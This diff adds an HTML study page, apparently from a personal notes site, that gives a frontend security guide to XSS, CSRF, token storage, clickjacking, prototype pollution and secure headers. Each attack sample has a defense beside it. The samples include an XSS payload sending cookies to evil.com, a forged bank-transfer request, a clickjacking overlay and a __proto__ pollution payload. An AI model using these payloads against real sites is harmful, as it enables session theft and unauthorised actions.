@@ -1,0 +1,500 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Frontend Security: A Senior Engineer&#x27;s Guide — Theory Notes</title>
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight-theme.css">
+</head>
+<body>
+<div class="layout">
+<nav class="sidebar"><h2 class="brand">Theory Notes</h2><details open><summary>JavaScript &amp; Runtime</summary><ul><li><a href="javascript-core.html">JavaScript Core</a></li><li><a href="v8-internals.html">V8 Internals</a></li></ul></details><details open><summary>Browser &amp; Rendering</summary><ul><li><a href="browser-document-execution.html">Browser Document Execution</a></li><li><a href="browser-internals.html">Browser Internals</a></li><li><a href="hydration.html">Hydration</a></li><li><a href="rendering-spectrum.html">Rendering Spectrum</a></li></ul></details><details open><summary>Performance</summary><ul><li><a href="assets.html">Assets</a></li><li><a href="cache.html">Cache</a></li><li><a href="core-web-vitals.html">Core Web Vitals</a></li><li><a href="react-performance.html">React Performance</a></li><li><a href="web-performance.html">Web Performance</a></li></ul></details><details open><summary>State &amp; Architecture</summary><ul><li><a href="microfrontend-design-system.html">MicroFrontEnd Design System</a></li><li><a href="monorepo.html">Monorepo</a></li><li><a href="optimistic-updates.html">Optimistic Updates</a></li><li><a href="state-machines.html">State Machines</a></li><li><a href="state-management.html">State Management</a></li></ul></details><details open><summary>Network &amp; Security</summary><ul><li><a href="cors-security.html">CORS Security</a></li><li><a href="graphql.html">GraphQL</a></li><li><a href="javascript-sdk.html">JavaScript SDK</a></li><li><a href="network.html">Network</a></li><li><a href="security.html" aria-current="page">Security</a></li></ul></details><details open><summary>Build &amp; Observability</summary><ul><li><a href="observability.html">Observability</a></li><li><a href="webpack.html">Webpack</a></li></ul></details><details open><summary>Case Studies</summary><ul><li><a href="yotube1000cuts.html">Yotube1000cuts</a></li></ul></details></nav>
+<main><h1 id="frontend-security-a-senior-engineers-guide">Frontend Security: A Senior Engineer's Guide</h1>
+<p>Security is not optional. Understanding attack vectors and defenses is essential for any production system.</p>
+<hr />
+<h2 id="1-xss-cross-site-scripting">1. XSS (Cross-Site Scripting)</h2>
+<p>The <strong>most common</strong> frontend vulnerability (~40% of reported vulnerabilities). Attacker injects malicious scripts into your page.</p>
+<h3 id="types-of-xss">Types of XSS</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>How It Works</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Stored XSS</strong></td>
+<td>Malicious script saved in DB, served to all users</td>
+<td>Comment: <code>&lt;script&gt;steal(cookies)&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td><strong>Reflected XSS</strong></td>
+<td>Script in URL, reflected in response</td>
+<td><code>site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td><strong>DOM-based XSS</strong></td>
+<td>Script manipulates DOM client-side</td>
+<td><code>innerHTML = location.hash</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="attack-example">Attack Example</h3>
+<pre><code class="language-js">// User submits this as their &quot;name&quot;
+const userName = '&lt;img src=x onerror=&quot;fetch(\'https://evil.com/steal?cookie=\'+document.cookie)&quot;&gt;';
+
+// Vulnerable code
+document.getElementById('greeting').innerHTML = `Hello, ${userName}!`;
+
+// Result: Attacker gets all cookies!
+</code></pre>
+<h3 id="defense-output-encoding">Defense: Output Encoding</h3>
+<pre><code class="language-js">// NEVER use innerHTML with user data
+element.innerHTML = userInput;  // DANGEROUS
+
+// Use textContent instead
+element.textContent = userInput;  // SAFE - treats as text, not HTML
+
+// Or sanitize HTML when you need rich content
+import DOMPurify from 'dompurify';
+element.innerHTML = DOMPurify.sanitize(userInput);
+</code></pre>
+<h3 id="defense-reacts-automatic-escaping">Defense: React's Automatic Escaping</h3>
+<pre><code class="language-jsx">// React escapes by default - SAFE
+&lt;div&gt;{userInput}&lt;/div&gt;
+
+// DANGEROUS - explicitly bypasses protection
+&lt;div dangerouslySetInnerHTML={{ __html: userInput }} /&gt;
+
+// If you must use it, sanitize first
+&lt;div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} /&gt;
+</code></pre>
+<h3 id="defense-content-security-policy-csp">Defense: Content Security Policy (CSP)</h3>
+<pre><code class="language-http">Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://trusted-cdn.com;
+  style-src 'self' 'unsafe-inline';
+  img-src *;
+  connect-src 'self' https://api.myapp.com;
+  frame-ancestors 'none';
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>default-src</code></td>
+<td>Fallback for all resource types</td>
+</tr>
+<tr>
+<td><code>script-src</code></td>
+<td>Where JS can load from</td>
+</tr>
+<tr>
+<td><code>style-src</code></td>
+<td>Where CSS can load from</td>
+</tr>
+<tr>
+<td><code>img-src</code></td>
+<td>Where images can load from</td>
+</tr>
+<tr>
+<td><code>connect-src</code></td>
+<td>Where fetch/XHR can connect</td>
+</tr>
+<tr>
+<td><code>frame-ancestors</code></td>
+<td>Who can embed this page (clickjacking prevention)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="csp-nonces-for-inline-scripts">CSP: Nonces for Inline Scripts</h3>
+<pre><code class="language-html">&lt;!-- Server generates random nonce per request --&gt;
+&lt;script nonce=&quot;random123abc&quot;&gt;
+  // This inline script is allowed
+  console.log('Trusted inline code');
+&lt;/script&gt;
+
+&lt;!-- Header includes the nonce --&gt;
+Content-Security-Policy: script-src 'nonce-random123abc'
+
+&lt;!-- Attacker's injected script has no nonce = BLOCKED --&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+</code></pre>
+<h3 id="defense-trusted-types-api">Defense: Trusted Types API</h3>
+<pre><code class="language-js">// Force browser to block unsafe DOM manipulations
+// Works in Chrome/Edge
+
+// In CSP header:
+Content-Security-Policy: require-trusted-types-for 'script'
+
+// Now this throws an error:
+element.innerHTML = userInput;  // TypeError!
+
+// Must use a Trusted Type:
+const policy = trustedTypes.createPolicy('myPolicy', {
+  createHTML: (input) =&gt; DOMPurify.sanitize(input)
+});
+
+element.innerHTML = policy.createHTML(userInput);  // OK
+</code></pre>
+<hr />
+<h2 id="2-csrf-cross-site-request-forgery">2. CSRF (Cross-Site Request Forgery)</h2>
+<p>Attacker tricks user's browser into making authenticated requests to your site.</p>
+<h3 id="the-attack">The Attack</h3>
+<pre><code>1. User logs into bank.com (session cookie set)
+2. User visits evil.com
+3. evil.com has: &lt;img src=&quot;https://bank.com/transfer?to=attacker&amp;amount=10000&quot;&gt;
+4. Browser sends request WITH bank.com cookies automatically
+5. Transfer happens without user's knowledge!
+</code></pre>
+<h3 id="defense-samesite-cookies">Defense: SameSite Cookies</h3>
+<pre><code class="language-http">Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>SameSite Value</th>
+<th>Behavior</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Strict</code></td>
+<td>Cookie NEVER sent on cross-site requests</td>
+</tr>
+<tr>
+<td><code>Lax</code></td>
+<td>Cookie sent on top-level navigations (links), not forms/images</td>
+</tr>
+<tr>
+<td><code>None</code></td>
+<td>Cookie always sent (must have <code>Secure</code> flag)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="defense-csrf-tokens-synchronizer-token-pattern">Defense: CSRF Tokens (Synchronizer Token Pattern)</h3>
+<pre><code class="language-html">&lt;!-- Server embeds unique token in form --&gt;
+&lt;form action=&quot;/transfer&quot; method=&quot;POST&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;abc123xyz&quot;&gt;
+  &lt;input type=&quot;text&quot; name=&quot;amount&quot;&gt;
+  &lt;button type=&quot;submit&quot;&gt;Transfer&lt;/button&gt;
+&lt;/form&gt;
+</code></pre>
+<pre><code class="language-js">// Server validates token matches session
+if (request.body.csrf_token !== session.csrfToken) {
+  return res.status(403).send('Invalid CSRF token');
+}
+</code></pre>
+<h3 id="defense-double-submit-cookie-for-spas">Defense: Double-Submit Cookie (For SPAs)</h3>
+<pre><code class="language-js">// Server sets a random value in a cookie
+Set-Cookie: XSRF-TOKEN=random123; Path=/
+
+// Frontend reads it and sends in header
+const token = document.cookie
+  .split('; ')
+  .find(row =&gt; row.startsWith('XSRF-TOKEN='))
+  ?.split('=')[1];
+
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: {
+    'X-XSRF-TOKEN': token  // Server compares cookie vs header
+  }
+});
+
+// Attacker can't read our cookies, so can't forge the header!
+</code></pre>
+<hr />
+<h2 id="3-secure-state-storage-management">3. Secure State &amp; Storage Management</h2>
+<p>One of the most common senior-level mistakes is storing sensitive data insecurely.</p>
+<h3 id="the-storage-hierarchy">The Storage Hierarchy</h3>
+<table>
+<thead>
+<tr>
+<th>Storage</th>
+<th>Security</th>
+<th>Use For</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>localStorage</code></td>
+<td>Accessible to ANY JS (XSS vulnerable)</td>
+<td>Non-sensitive preferences</td>
+</tr>
+<tr>
+<td><code>sessionStorage</code></td>
+<td>Same as localStorage, cleared on tab close</td>
+<td>Temporary non-sensitive data</td>
+</tr>
+<tr>
+<td><code>HttpOnly Cookie</code></td>
+<td>NOT accessible to JS</td>
+<td>Session tokens, auth tokens</td>
+</tr>
+<tr>
+<td><code>In-Memory</code></td>
+<td>Lost on refresh, safest from XSS</td>
+<td>Short-lived access tokens</td>
+</tr>
+</tbody>
+</table>
+<h3 id="the-secure-token-pattern">The Secure Token Pattern</h3>
+<pre><code>┌──────────┐                              ┌──────────┐
+│  Client  │                              │  Server  │
+└────┬─────┘                              └────┬─────┘
+     │                                         │
+     │  Login: username/password               │
+     │────────────────────────────────────────▶│
+     │                                         │
+     │  Access Token (15min) in JSON body      │
+     │  Refresh Token in HttpOnly cookie       │
+     │◀────────────────────────────────────────│
+     │                                         │
+     │  Store access token IN MEMORY ONLY      │
+     │                                         │
+     │  API calls with: Authorization: Bearer  │
+     │────────────────────────────────────────▶│
+     │                                         │
+     │  Access token expired (401)             │
+     │◀────────────────────────────────────────│
+     │                                         │
+     │  POST /refresh (HttpOnly cookie sent)   │
+     │────────────────────────────────────────▶│
+     │                                         │
+     │  New access token in response body      │
+     │◀────────────────────────────────────────│
+</code></pre>
+<p><strong>Why this pattern?</strong>
+- Access token in memory: XSS can't steal it from localStorage
+- Refresh token in HttpOnly cookie: XSS can't read it
+- Short-lived access token: Limits damage window if stolen</p>
+<hr />
+<h2 id="4-clickjacking-ui-redressing">4. Clickjacking (UI Redressing)</h2>
+<p>Attacker overlays invisible iframe over legitimate content.</p>
+<h3 id="the-attack_1">The Attack</h3>
+<pre><code class="language-html">&lt;!-- On evil.com --&gt;
+&lt;style&gt;
+  iframe {
+    opacity: 0;
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+  }
+&lt;/style&gt;
+
+&lt;button&gt;Click to win $1000!&lt;/button&gt;
+&lt;iframe src=&quot;https://bank.com/transfer?to=attacker&quot;&gt;&lt;/iframe&gt;
+
+&lt;!-- User thinks they click button, actually clicks iframe --&gt;
+</code></pre>
+<h3 id="defense-x-frame-options">Defense: X-Frame-Options</h3>
+<pre><code class="language-http">X-Frame-Options: DENY              # Never allow framing
+X-Frame-Options: SAMEORIGIN        # Only same origin can frame
+</code></pre>
+<h3 id="defense-csp-frame-ancestors-modern">Defense: CSP frame-ancestors (Modern)</h3>
+<pre><code class="language-http">Content-Security-Policy: frame-ancestors 'self' https://trusted.com
+</code></pre>
+<hr />
+<h2 id="5-third-party-supply-chain-attacks">5. Third-Party Supply Chain Attacks</h2>
+<p>Modern frontend apps have thousands of dependencies. If one package is compromised, your system is at risk.</p>
+<h3 id="defense-subresource-integrity-sri">Defense: Subresource Integrity (SRI)</h3>
+<pre><code class="language-html">&lt;script
+  src=&quot;https://cdn.example.com/library.js&quot;
+  integrity=&quot;sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC&quot;
+  crossorigin=&quot;anonymous&quot;&gt;
+&lt;/script&gt;
+</code></pre>
+<p>If the file's hash doesn't match, browser <strong>refuses to execute</strong>.</p>
+<h3 id="defense-automated-auditing">Defense: Automated Auditing</h3>
+<pre><code class="language-bash"># In CI/CD pipeline
+npm audit --audit-level=high
+# Fails build if high/critical vulnerabilities found
+</code></pre>
+<h3 id="defense-sandboxed-iframes-for-third-party-scripts">Defense: Sandboxed Iframes for Third-Party Scripts</h3>
+<pre><code class="language-html">&lt;!-- Risky third-party script (e.g., ad tracker) --&gt;
+&lt;iframe
+  src=&quot;https://ads.example.com/tracker&quot;
+  sandbox=&quot;allow-scripts&quot;
+  style=&quot;display: none;&quot;&gt;
+&lt;/iframe&gt;
+
+&lt;!-- sandbox restricts: --&gt;
+&lt;!-- - No access to parent DOM --&gt;
+&lt;!-- - No cookies from parent origin --&gt;
+&lt;!-- - No form submission --&gt;
+&lt;!-- - No top-level navigation --&gt;
+</code></pre>
+<hr />
+<h2 id="6-prototype-pollution">6. Prototype Pollution</h2>
+<p>A JavaScript-specific attack where attacker modifies <code>Object.prototype</code>.</p>
+<h3 id="the-attack_2">The Attack</h3>
+<pre><code class="language-js">// Vulnerable merge function
+function merge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object') {
+      target[key] = merge(target[key] || {}, source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+  return target;
+}
+
+// Attacker sends JSON payload:
+const malicious = JSON.parse('{&quot;__proto__&quot;: {&quot;isAdmin&quot;: true}}');
+merge({}, malicious);
+
+// Now EVERY object has isAdmin: true!
+const user = {};
+console.log(user.isAdmin);  // true!
+</code></pre>
+<h3 id="defense">Defense</h3>
+<pre><code class="language-js">// Check for dangerous keys
+function safeMerge(target, source) {
+  for (let key in source) {
+    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
+      continue;  // Skip dangerous keys
+    }
+    if (typeof source[key] === 'object' &amp;&amp; source[key] !== null) {
+      target[key] = safeMerge(target[key] || {}, source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+  return target;
+}
+
+// Or use Object.create(null) for prototype-less objects
+const safeObject = Object.create(null);  // No prototype chain
+</code></pre>
+<hr />
+<h2 id="7-secrets-management">7. Secrets Management</h2>
+<h3 id="never-expose-in-frontend-code">Never Expose in Frontend Code</h3>
+<pre><code class="language-js">// WRONG: Bundled into client JS, visible to anyone
+const API_KEY = 'sk_live_abc123';
+fetch(`https://api.stripe.com/charges?key=${API_KEY}`);
+
+// RIGHT: Proxy through your server
+fetch('/api/create-charge', { method: 'POST', body: data });
+
+// Server adds the secret
+app.post('/api/create-charge', (req, res) =&gt; {
+  fetch('https://api.stripe.com/charges', {
+    headers: { 'Authorization': `Bearer ${process.env.STRIPE_SECRET_KEY}` }
+  });
+});
+</code></pre>
+<h3 id="whats-ok-to-expose">What's OK to Expose</h3>
+<pre><code class="language-js">// Public/Publishable keys are DESIGNED for frontend
+const STRIPE_PUBLISHABLE_KEY = 'pk_live_xyz';  // OK
+const FIREBASE_API_KEY = 'AIzaSy...';  // OK (scoped by security rules)
+const GOOGLE_MAPS_KEY = 'abc123';  // OK (restricted by HTTP referrer)
+</code></pre>
+<hr />
+<h2 id="8-secure-headers-checklist">8. Secure Headers Checklist</h2>
+<pre><code class="language-http"># Prevent XSS
+Content-Security-Policy: default-src 'self'; script-src 'self'
+
+# Prevent clickjacking
+X-Frame-Options: DENY
+
+# Prevent MIME sniffing
+X-Content-Type-Options: nosniff
+
+# Force HTTPS for 1 year
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+
+# Control Referer header
+Referrer-Policy: strict-origin-when-cross-origin
+
+# Limit browser features
+Permissions-Policy: geolocation=(), microphone=(), camera=()
+</code></pre>
+<hr />
+<h2 id="9-security-checklist-summary">9. Security Checklist Summary</h2>
+<table>
+<thead>
+<tr>
+<th>Priority</th>
+<th>Action</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Critical</strong></td>
+<td>HTTPS Only</td>
+<td>Protects data in transit (MitM attacks)</td>
+</tr>
+<tr>
+<td><strong>Critical</strong></td>
+<td>Sanitize &amp; Validate</td>
+<td>Never trust user input, URL params, or API data</td>
+</tr>
+<tr>
+<td><strong>Critical</strong></td>
+<td>CSP with nonces</td>
+<td>Mitigates XSS by blocking inline scripts</td>
+</tr>
+<tr>
+<td><strong>High</strong></td>
+<td>HttpOnly cookies</td>
+<td>Prevents XSS from stealing session tokens</td>
+</tr>
+<tr>
+<td><strong>High</strong></td>
+<td>SameSite=Strict cookies</td>
+<td>Prevents CSRF attacks</td>
+</tr>
+<tr>
+<td><strong>High</strong></td>
+<td>No secrets in frontend</td>
+<td>Use server-side proxy for sensitive API keys</td>
+</tr>
+<tr>
+<td><strong>Medium</strong></td>
+<td>SRI for CDN scripts</td>
+<td>Prevents supply chain attacks</td>
+</tr>
+<tr>
+<td><strong>Medium</strong></td>
+<td>Automated dependency audits</td>
+<td>Catches vulnerable packages early</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="10-interview-tip">10. Interview Tip</h2>
+<blockquote>
+<p>"I approach frontend security with defense in depth. For XSS, I use output encoding (textContent over innerHTML), React's automatic escaping, and strict CSP with nonces. For CSRF, I combine SameSite cookies with token validation. For authentication, I prefer short-lived access tokens in memory with refresh tokens in HttpOnly cookies — this limits XSS damage while maintaining usability. I always validate on the server (client validation is just UX), use SRI for CDN scripts, and ensure secure headers are set (HSTS, X-Frame-Options, CSP). For supply chain security, I integrate npm audit into CI/CD."</p>
+</blockquote></main>
+</div>
+<script src="../assets/highlight.min.js"></script>
+<script src="../assets/mermaid.min.js"></script>
+<script>
+hljs.configure({ cssSelector: 'pre code[class^="language-"]' });
+hljs.highlightAll();
+mermaid.initialize({
+  startOnLoad: true,
+  theme: 'base',
+  themeVariables: {
+    primaryColor: '#ece9fd',
+    primaryBorderColor: '#5b3df0',
+    primaryTextColor: '#232037',
+    lineColor: '#5b3df0',
+    fontFamily: 'ui-sans-serif, -apple-system, sans-serif',
+    fontSize: '13px'
+  }
+});
+</script>
+</body>
+</html>
